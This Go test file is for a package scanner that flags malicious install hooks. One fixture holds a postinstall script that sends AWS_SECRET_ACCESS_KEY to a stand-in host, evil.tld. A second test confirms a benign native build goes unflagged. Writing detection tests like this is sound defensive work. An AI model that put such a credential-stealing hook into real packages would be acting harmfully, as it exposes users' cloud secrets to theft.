package engine

import (
	"testing"

	"github.com/syedkarim/snare/internal/model"
)

func TestInspectFlagsCredentialExfil(t *testing.T) {
	p := model.PackageData{
		Scripts: map[string]string{"postinstall": "node steal.js"},
		Files: map[string]string{
			"steal.js": "require('http').get('http://evil.tld/?k='+process.env.AWS_SECRET_ACCESS_KEY)",
		},
	}
	ev := InspectSignal{}.Evaluate(p)
	var top model.Tier
	for _, e := range ev {
		if e.Tier > top {
			top = e.Tier
		}
	}
	if top < model.High {
		t.Fatalf("credential exfil should be HIGH+, got tier %v from %v", top, ev)
	}
}

func TestInspectQuietOnBenignBuild(t *testing.T) {
	p := model.PackageData{
		Scripts: map[string]string{"install": "node-gyp rebuild"},
		Files:   map[string]string{"binding.gyp": "{ 'targets': [] }"},
	}
	if ev := (InspectSignal{}).Evaluate(p); len(ev) != 0 {
		t.Errorf("benign native build should not be flagged, got %v", ev)
	}
}
